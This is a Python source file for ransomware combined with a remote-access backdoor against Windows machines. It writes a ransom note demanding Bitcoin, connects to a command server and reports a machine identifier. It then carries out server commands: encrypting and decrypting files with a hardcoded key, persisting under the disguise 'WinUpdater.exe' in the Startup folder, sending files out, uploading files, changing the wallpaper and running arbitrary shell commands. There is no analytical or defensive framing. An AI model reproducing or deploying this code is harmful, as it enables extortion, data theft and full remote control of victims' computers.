import threading
import subprocess as sp
import socket
import uuid
import base64
import os
import time 
from cryptography.fernet import Fernet
import shutil
import ctypes


def ransom():

    desktop = os.path.join(os.environ['USERPROFILE'],"Desktop\\README.txt")
    with open(desktop, 'w') as fp:
        fp.write("What Happened?\nYour important files are encrypted. Many of your documents are no longer\naccessible because they have been encrypted. Do not waste your time,\nnobody can recover your files without our decryption device.\n\nCan I Recover My Files?\nSure you can. We guarantee that you can recover all your files safely.\nHowever if you want to decrypt all your files, you need to pay a ransom.\n\nHow Do I Pay?\nPayment is accepted in Bitcoin only.You must pay USD $500 to the address below.\nmnokZ3joQUE37X8iYeGyzxnmS6aRRRC5rG\nAfter your payment, we will provide you a decryptor to decrypt all your\nencrypted files.")
        fp.close()

    key = "tTiY2sbZnpDQQYbloP6Zdw5jF1Jfp_Qfv0pXFY-r-F8="
    HOST = '10.0.0.11'    # The remote host
    PORT = 5000 #Remote port
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((HOST, PORT))
        a=hex(uuid.getnode())
        a = bytes(a, 'utf-8')
        a=base64.b64encode(a)
        s.sendall(a)
        while True:
            msg=s.recv(2048).decode('utf-8')
            if msg[:2] == 'cd':
                os.chdir(msg[3:])
            elif msg[:5] == 'exit':
                break
            elif msg[:7] == 'persist':
                exe = os.getcwd()+"\\WinUpdater.exe"
                end = os.path.join(os.environ['USERPROFILE'],"Appdata\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")
                shutil.copy2(exe, end)
            elif msg[:4] == "copy":
                command = msg.split(" ")
                file = command[-2]
                path = command[-1]
                new_path = "copy "+file+" "+path      
                os.system(new_path)
            elif msg[:7] == 'decrypt':
                fernet = Fernet(key)
                file = msg.split(" ")
                path = file[-1]
                with open(path, "rb") as enc_file:
                    encrypted = enc_file.read()
                decrypted = fernet.decrypt(encrypted)
                with open(path, 'wb') as dec_file:
                    dec_file.write(decrypted)
            elif msg[:7] == 'encrypt':
                file = msg.split(" ")
                path = file[-1]
                fernet = Fernet(key)
                with open(path, "rb") as path2:
                    original = path2.read()
                encrypted = fernet.encrypt(original)
                with open(path, 'wb') as encrypted_file:
                    encrypted_file.write(encrypted)
            elif msg[:8] == 'download':
                file = msg[9:]
                file = open(file, "rb")
                data = file.read()
                file.close()
                while True:
                    if len(data) > 0:
                        temp_data = data[:1024]
                        if len(temp_data) < 1024:
                            temp_data += chr(0).encode() * (1024 - len(temp_data))
                        
                        data = data[1024:]
                        s.send(temp_data)
                    else:
                        s.send(bytes("Ended",'utf-8'))
                        time.sleep(0.5)
                        break
            elif msg[:6] == "upload":
                cmd_list = msg.split(" ")
                data = b""
                while True:
                    end_data = s.recv(1024)
                    if end_data == b"End":
                        break
                    data += end_data
                new_file = open(cmd_list[2], "wb")
                new_file.write(data)
                new_file.close()       
            elif msg[:2] == "bg":
                cmd_list = msg.split(" ")
                data = b""
                while True:
                    end_data = s.recv(1024)
                    if end_data == b"End":
                        break
                    data += end_data
                new_file = open(cmd_list[2], "wb")
                new_file.write(data)
                new_file.close()
                path = os.getcwd()+'\\'+cmd_list[1]
                SPI_SETDESKWALLPAPER = 20 
                ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, path, 3)
                
            else: 
                output = sp.getoutput(msg)
                msg = bytes(output, 'utf-8')
                s.sendall(msg)

        

ransom()
